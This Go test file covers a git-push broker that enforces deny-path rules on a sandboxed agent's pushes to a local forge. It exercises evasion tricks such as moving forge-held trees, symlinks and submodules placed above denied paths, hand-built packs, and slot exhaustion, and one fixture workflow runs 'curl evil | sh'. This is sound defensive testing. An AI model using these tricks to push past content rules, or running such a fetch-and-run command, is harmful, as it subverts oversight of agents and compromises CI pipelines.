// Copyright 2025 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/cjohnstoniv/wardyn/internal/gitpack"
	"github.com/cjohnstoniv/wardyn/internal/types"
)

// The pushes in this file are the ones a pack-only inspector cannot see through
// unless it refuses what it cannot read: a tree the forge already stores,
// placed at a denied path, and a symlink or submodule standing above one. Each
// is driven with a stock git client against a real local forge over HTTP, and
// each asserts on what the FORGE ends up holding — a refusal that still let
// the objects land would pass a status-code check.

// forgeRun is a governed run against a local forge: a bare repository seeded
// with files, a broker in front of it under the given deny list, and a clone
// made through that broker.
type forgeRun struct {
	bare, work, ref string
	decisions       *bytes.Buffer
	brokerURL       string
	forge           *gitForge
	mu              sync.Mutex
	refusal         string // the body of the last refused receive-pack POST
}

func newForgeRun(t *testing.T, seed map[string]string, cloneArgs []string, deny ...string) *forgeRun {
	t.Helper()
	return newForgeRunVia(t, "", seed, cloneArgs, deny...)
}

// newForgeRunVia is newForgeRun through the git_pat lane for patHost, or
// through the GitHub App lane when patHost is "".
func newForgeRunVia(t *testing.T, patHost string, seed map[string]string, cloneArgs []string,
	deny ...string) *forgeRun {
	t.Helper()
	forge := newGitForge(t)
	bare := filepath.Join(forge.root, "octocat", "hello-world.git")
	if err := os.MkdirAll(filepath.Dir(bare), 0o755); err != nil {
		t.Fatal(err)
	}
	runGit(t, forge.root, "init", "-q", "--bare", "--initial-branch=main", bare)
	s := t.TempDir()
	runGit(t, s, "init", "-q", "--initial-branch=main", s)
	writeFiles(t, s, seed)
	runGit(t, s, "add", "-A")
	runGit(t, s, "commit", "-qm", "seed")
	runGit(t, s, "push", "-q", bare, "HEAD:refs/heads/main")

	var p *Proxy
	var decisions *bytes.Buffer
	repoPath := "/wardyn/gh/octocat/hello-world"
	if patHost == "" {
		p, decisions = newGitBrokerProxyWithSpec(t, map[string]uuid.UUID{"octocat/hello-world": uuid.New()},
			upstreamAddr(forge.srv), contentRulesSpec(deny...))
	} else {
		p, decisions = newPATBrokerProxySpec(t, contentRulesSpec(deny...),
			map[string]PATGrant{patHost: {GrantID: uuid.New(), Username: "x-access-token"}},
			upstreamAddr(forge.srv))
		repoPath = "/wardyn/git/" + patHost + "/octocat/hello-world.git"
	}
	r := &forgeRun{bare: bare, ref: BranchNSPrefix(p.runID) + "work", decisions: decisions, forge: forge}
	// git drops a refused receive-pack's body, so the broker's answer is kept
	// here for the tests that assert on the reason it gives.
	broker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		if !strings.HasSuffix(req.URL.Path, "/git-receive-pack") {
			p.ServeHTTP(w, req)
			return
		}
		rec := httptest.NewRecorder()
		p.ServeHTTP(rec, req)
		if rec.Code >= http.StatusBadRequest {
			r.mu.Lock()
			r.refusal = rec.Body.String()
			r.mu.Unlock()
		}
		for k, v := range rec.Header() {
			w.Header()[k] = v
		}
		w.WriteHeader(rec.Code)
		_, _ = w.Write(rec.Body.Bytes())
	}))
	t.Cleanup(broker.Close)
	r.brokerURL = broker.URL
	r.work = filepath.Join(t.TempDir(), "work")
	args := append(append([]string{"clone", "-q"}, cloneArgs...), broker.URL+repoPath, r.work)
	runGit(t, t.TempDir(), args...)
	return r
}

// lastRefusal is the body the broker answered the last refused push with.
func (r *forgeRun) lastRefusal() string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.refusal
}

// commit stages everything in the working tree and commits it.
func (r *forgeRun) commit(t *testing.T, msg string) {
	t.Helper()
	runGit(t, r.work, "add", "-A")
	runGit(t, r.work, "commit", "-qm", msg)
}

// push runs `git [config...] push origin HEAD:<run branch>` and reports what
// git said and whether it succeeded.
func (r *forgeRun) push(config ...string) (string, error) {
	var args []string
	for _, c := range config {
		args = append(args, "-c", c)
	}
	cmd := exec.Command("git", append(args, "push", "origin", "HEAD:"+r.ref)...)
	cmd.Dir, cmd.Env = r.work, gitEnv()
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// forgeHolds reports whether the forge's run branch holds path. A branch the
// forge never created holds nothing.
func (r *forgeRun) forgeHolds(t *testing.T, path string) bool {
	t.Helper()
	if exec.Command("git", "-C", r.bare, "rev-parse", "-q", "--verify", r.ref).Run() != nil {
		return false
	}
	out, err := exec.Command("git", "-C", r.bare, "ls-tree", "-r", "--name-only", r.ref).CombinedOutput()
	if err != nil {
		t.Fatalf("ls-tree: %v\n%s", err, out)
	}
	return strings.Contains("\n"+string(out), "\n"+path+"\n")
}

// wantRefused asserts a push was refused by the content rules and that the
// forge does not hold the path it would have placed.
func (r *forgeRun) wantRefused(t *testing.T, out string, err error, path string) {
	t.Helper()
	if err == nil {
		t.Errorf("git push succeeded, want a refusal\n%s", out)
	}
	if !strings.Contains(r.decisions.String(), `"rule_source":"`+ruleSourceGitRules+`"`) {
		t.Errorf("no %s decision; the push failed for another reason:\n%s\n%s", ruleSourceGitRules, out, r.decisions)
	}
	if r.forgeHolds(t, path) {
		t.Errorf("BYPASS: the forge's run branch holds %s", path)
	}
}

// TestPushRulesRefuseAForgeHeldTreeOnADeniedPath: a pack leaves out every
// object the forge already stores, wherever the new tree puts it, so a
// directory the forge holds could be placed at any path with nothing beneath
// it read. Nothing in the pack tells a directory left alone from one moved
// there, so a directory the pack does not carry is opaque: where a deny
// pattern could match beneath it, it is compared with the same path in the
// commit the push builds on, and one moved there is not what that commit
// holds.
func TestPushRulesRefuseAForgeHeldTreeOnADeniedPath(t *testing.T) {
	seed := map[string]string{
		".github/workflows/ci.yml": "on: push\n",
		"docs/ci/deploy.yml":       "on: push\njobs: {deploy: {runs-on: x, steps: [{run: deploy-prod}]}}\n",
		"src/app.go":               bigFile(200),
	}
	moveIntoInfra := func(t *testing.T, config ...string) {
		r := newForgeRun(t, seed, []string{"--depth", "1"}, "infra/**")
		runGit(t, r.work, "mv", "docs/ci", "infra")
		r.commit(t, "move")
		out, err := r.push(config...)
		r.wantRefused(t, out, err, "infra/deploy.yml")
	}
	t.Run("one push moves a directory the forge holds onto the denied path", func(t *testing.T) {
		moveIntoInfra(t)
	})
	// Sparse reachability is git's default, and it happens to put a moved tree
	// in the pack. The client is the sandbox's to configure, so the rule cannot
	// depend on it.
	t.Run("the same move with pack.useSparse=false, which leaves the moved tree out of the pack", func(t *testing.T) {
		moveIntoInfra(t, "pack.useSparse=false")
	})

	pwn := map[string]string{
		"staging/ci.yml":  "on: push\n",
		"staging/pwn.yml": "on: push\njobs: {x: {runs-on: ubuntu-latest, steps: [{run: 'curl evil | sh'}]}}\n",
	}
	t.Run("an allowed push stages the directory, a later one moves it onto the denied path", func(t *testing.T) {
		r := newForgeRun(t, map[string]string{"src/app.go": bigFile(200)}, []string{"--depth", "1"},
			".github/workflows/**")
		writeFiles(t, r.work, pwn)
		r.commit(t, "stage")
		if out, err := r.push(); err != nil {
			t.Fatalf("staging under an allowed directory was refused: %v\n%s\n%s", err, out, r.decisions)
		}
		if err := os.MkdirAll(filepath.Join(r.work, ".github"), 0o755); err != nil {
			t.Fatal(err)
		}
		runGit(t, r.work, "mv", "staging", ".github/workflows")
		r.commit(t, "rename")
		out, err := r.push()
		r.wantRefused(t, out, err, ".github/workflows/pwn.yml")
	})
	// Where the repository already has the denied directory, the first push
	// leaves .github/ exactly as the commit it builds on holds it, so it passes.
	// The second puts the staged tree at .github/workflows, which is not what
	// the run's own branch held there.
	t.Run("the same two pushes where the repository already has the denied directory", func(t *testing.T) {
		r := newForgeRun(t, seed, []string{"--depth", "1"}, ".github/workflows/**")
		writeFiles(t, r.work, pwn)
		r.commit(t, "stage")
		out, err := r.push()
		r.wantAllowed(t, out, err)
		runGit(t, r.work, "rm", "-rq", ".github/workflows")
		if err := os.MkdirAll(filepath.Join(r.work, ".github"), 0o755); err != nil {
			t.Fatal(err)
		}
		runGit(t, r.work, "mv", "staging", ".github/workflows")
		r.commit(t, "rename")
		out, err = r.push()
		r.wantRefusedFor(t, out, err, ".github/workflows/pwn.yml", whyChanged)
	})

	// The sandbox owns its client, so it chooses what the pack omits: here a
	// commit whose whole root tree is an older revision the forge still stores,
	// sent as the commit object alone.
	t.Run("a hand-built commit whose whole tree is an older one the forge stores", func(t *testing.T) {
		r := newForgeRun(t, map[string]string{"infra/main.tf": "prod\n", "src/app.go": "x\n"}, nil, "infra/**")
		// The forge's own history moves on outside the run: infra/ is dropped.
		runGit(t, r.work, "rm", "-rq", "infra")
		r.commit(t, "drop infra")
		runGit(t, r.work, "push", "-q", r.bare, "HEAD:refs/heads/main")

		cmd := exec.Command("git", "commit-tree", "HEAD~1^{tree}", "-p", "HEAD", "-m", "restore")
		cmd.Dir, cmd.Env = r.work, gitEnv()
		oid, err := cmd.Output()
		if err != nil {
			t.Fatal(err)
		}
		c := strings.TrimSpace(string(oid))
		pk := exec.Command("git", "pack-objects", "--stdout")
		pk.Dir, pk.Env, pk.Stdin = r.work, gitEnv(), strings.NewReader(c+"\n")
		pack, err := pk.Output()
		if err != nil {
			t.Fatal(err)
		}
		line := strings.Repeat("0", 40) + " " + c + " " + r.ref + "\x00report-status object-format=sha1\n"
		resp, err := http.Post(r.brokerURL+"/wardyn/gh/octocat/hello-world/git-receive-pack",
			"application/x-git-receive-pack-request",
			strings.NewReader(fmt.Sprintf("%04x%s0000", len(line)+4, line)+string(pack)))
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden || !strings.Contains(string(body), "  /\n") {
			t.Errorf("status %d, body %q: want 403 naming the whole tree as uncarried", resp.StatusCode, body)
		}
		r.wantRefused(t, string(body), fmt.Errorf("status %d", resp.StatusCode), "infra/main.tf")
	})
}

// TestPushRulesRefuseALinkAboveADeniedPath: a symlink or submodule at a PARENT
// of a denied path is a leaf in the pushed tree, but a checkout resolves paths
// beneath it to content no tree entry names — infra -> stage turns
// stage/prod/main.tf into infra/prod/main.tf. It is refused where a deny
// pattern could match beneath it.
func TestPushRulesRefuseALinkAboveADeniedPath(t *testing.T) {
	seed := map[string]string{"src/app.go": "package main\n"}
	t.Run("a symlink standing in for the denied directory's parent", func(t *testing.T) {
		r := newForgeRun(t, seed, []string{"--depth", "1"}, "infra/prod/**")
		writeFiles(t, r.work, map[string]string{"stage/prod/main.tf": "resource \"x\" \"y\" {}\n"})
		if err := os.Symlink("stage", filepath.Join(r.work, "infra")); err != nil {
			t.Skipf("symlinks unavailable on this filesystem: %v", err)
		}
		r.commit(t, "symlink")
		out, err := r.push()
		r.wantRefused(t, out, err, "infra")
	})
	t.Run("a submodule at the denied directory's parent", func(t *testing.T) {
		r := newForgeRun(t, seed, []string{"--depth", "1"}, "infra/prod/**")
		runGit(t, r.work, "update-index", "--add", "--cacheinfo",
			"160000,1111111111111111111111111111111111111111,infra")
		runGit(t, r.work, "commit", "-qm", "submodule")
		out, err := r.push()
		r.wantRefused(t, out, err, "infra")
	})
}

// TestPushRulesMatchWhatCouldLieBeneathAnOpaqueEntry pins the matcher half of
// the two tests above: an opaque entry is claimed when a pattern matches the
// entry or could match anything beneath it, a regular file only when it
// matches.
func TestPushRulesMatchWhatCouldLieBeneathAnOpaqueEntry(t *testing.T) {
	cases := []struct {
		pattern, path, mode string
		want                bool
	}{
		{"infra/prod/**", "infra", "120000", true},
		{"infra/prod/**", "infra", "160000", true},
		{"infra/prod/**", "infra", gitpack.ModeUncarried, true},
		{"infra/prod/**", "infra/prod", "120000", true},
		{".github/workflows/**", ".github", "120000", true},
		{"infra/**", "infra", "120000", true},
		{"**/*.pem", "src", gitpack.ModeUncarried, true},
		{"infra/**", "", gitpack.ModeUncarried, true}, // the whole tree, uncarried
		{"*.pem", "", gitpack.ModeUncarried, true},
		{"infra/prod/**", "infra", "100644", false}, // a regular file named infra hides nothing
		{"infra/prod/**", "stage", "120000", false},
		{"infra/prod/**", "infra/dev", gitpack.ModeUncarried, false},
		{"infra", "infra", gitpack.ModeUncarried, true}, // the entry itself, as for a symlink
		{"infra.tf", "infra", gitpack.ModeUncarried, false},
		{"*.pem", "certs", gitpack.ModeUncarried, false}, // anchored: *.pem names root files only
		{".github/workflows/**", "src", gitpack.ModeUncarried, false},
	}
	for _, c := range cases {
		t.Run(c.pattern+" vs "+c.path+" "+c.mode, func(t *testing.T) {
			rs := compilePushRules(&types.PushRulesSpec{DenyPaths: []string{c.pattern}})
			hits, unknown, err := match(rs.deny, []gitpack.Change{{Path: c.path, Mode: c.mode, Size: -1}})
			if err != nil {
				t.Fatalf("match: %v", err)
			}
			if got := len(hits)+len(unknown) > 0; got != c.want {
				t.Errorf("matched = %v, want %v", got, c.want)
			}
		})
	}
}

// TestPushRulesRefuseEveryPushWhenAPatternCannotBeRead: write-time validation
// refuses "./infra/**", "infra//**" and ".." segments, because each would match
// nothing. A policy that reached the broker without that check must not read
// as enforced either, so every push is refused and the entry is named.
func TestPushRulesRefuseEveryPushWhenAPatternCannotBeRead(t *testing.T) {
	for _, pat := range []string{"./infra/**", "infra//**", "infra/../x"} {
		t.Run(pat, func(t *testing.T) {
			up := newGitBrokerUpstream(t, "gh-inst-token")
			p, sink := newGitBrokerProxyWithSpec(t,
				map[string]uuid.UUID{"octocat/hello-world": uuid.New()}, upstreamAddr(up.srv),
				contentRulesSpec(".github/workflows/**", pat))
			body := recordedPush(t, BranchNSPrefix(p.runID)+"work", map[string]string{"src/app.go": "package main\n"})
			rec := postPush(t, p, string(body))
			if rec.Code != http.StatusUnsupportedMediaType || !strings.Contains(rec.Body.String(), pat) {
				t.Errorf("status %d, body %q: want 415 naming %q", rec.Code, rec.Body, pat)
			}
			if !strings.Contains(sink.String(), `"rule_source":"`+ruleSourceGitPackBlind+`"`) {
				t.Errorf("decision log = %s, want %s", sink, ruleSourceGitPackBlind)
			}
			if up.gitHits != 0 {
				t.Errorf("the push was forwarded %d time(s)", up.gitHits)
			}
		})
	}
}

// TestPushRulesTakeTheInspectionSlot: a push is a small body the agent chooses
// that inflates to whatever gitpack's ceilings allow, and the sidecar has a
// hard 256 MiB cap. Inspection therefore takes the process's one inspection
// slot — the one LLM request scanning takes — and a push that cannot get it in
// time is refused, never forwarded unread.
func TestPushRulesTakeTheInspectionSlot(t *testing.T) {
	up := newGitBrokerUpstream(t, "gh-inst-token")
	p, sink := newGitBrokerProxyWithSpec(t,
		map[string]uuid.UUID{"octocat/hello-world": uuid.New()}, upstreamAddr(up.srv),
		contentRulesSpec(".github/workflows/**"))
	body := recordedPush(t, BranchNSPrefix(p.runID)+"work", map[string]string{"src/app.go": "package main\n"})

	scanSlots <- struct{}{} // another inspection is in progress
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, mustLocalReq(t, http.MethodPost, "/wardyn/gh/octocat/hello-world/git-receive-pack",
		strings.NewReader(string(body))).WithContext(ctx))
	cancel()
	<-scanSlots

	if rec.Code != http.StatusServiceUnavailable {
		t.Errorf("status with the slot held = %d, want 503", rec.Code)
	}
	if !strings.Contains(sink.String(), `"rule_source":"`+ruleSourceGitPackBlind+`"`) {
		t.Errorf("decision log = %s, want %s", sink, ruleSourceGitPackBlind)
	}
	if up.gitHits != 0 {
		t.Fatalf("a push that was never inspected was forwarded")
	}

	// With the slot free the same push is inspected and forwarded, and its
	// buffer is given back to the retained-bytes budget once the forward ends.
	if rec := postPush(t, p, string(body)); rec.Code != http.StatusOK {
		t.Fatalf("status with the slot free = %d, want 200: %s", rec.Code, rec.Body)
	}
	if n := scanRetained.inUse(); n != 0 {
		t.Errorf("%d bytes still charged to the retained-bytes budget after the push completed", n)
	}
}

// TestPushRulesDiscoveryMintsBeforeAnyRefusal pins the claim the documentation
// makes, because the earlier one was wrong: git's discovery request precedes
// every push and mints the credential, so the content rules decide what reaches
// the forge, not whether a credential is issued. The refused POST itself mints
// nothing further.
func TestPushRulesDiscoveryMintsBeforeAnyRefusal(t *testing.T) {
	up := newGitBrokerUpstream(t, "gh-inst-token")
	p, _ := newGitBrokerProxyWithSpec(t,
		map[string]uuid.UUID{"octocat/hello-world": uuid.New()}, upstreamAddr(up.srv),
		contentRulesSpec(".github/workflows/**"))
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, mustLocalReq(t, http.MethodGet,
		"/wardyn/gh/octocat/hello-world/info/refs?service=git-receive-pack", nil))
	if up.mintCalls != 1 {
		t.Fatalf("mints after discovery = %d, want 1", up.mintCalls)
	}
	body := recordedPush(t, BranchNSPrefix(p.runID)+"work", map[string]string{".github/workflows/ci.yml": "on: push\n"})
	if rec := postPush(t, p, string(body)); rec.Code != http.StatusForbidden {
		t.Fatalf("push status = %d, want 403", rec.Code)
	}
	if up.mintCalls != 1 {
		t.Errorf("mints after the refused push = %d, want still 1", up.mintCalls)
	}
}
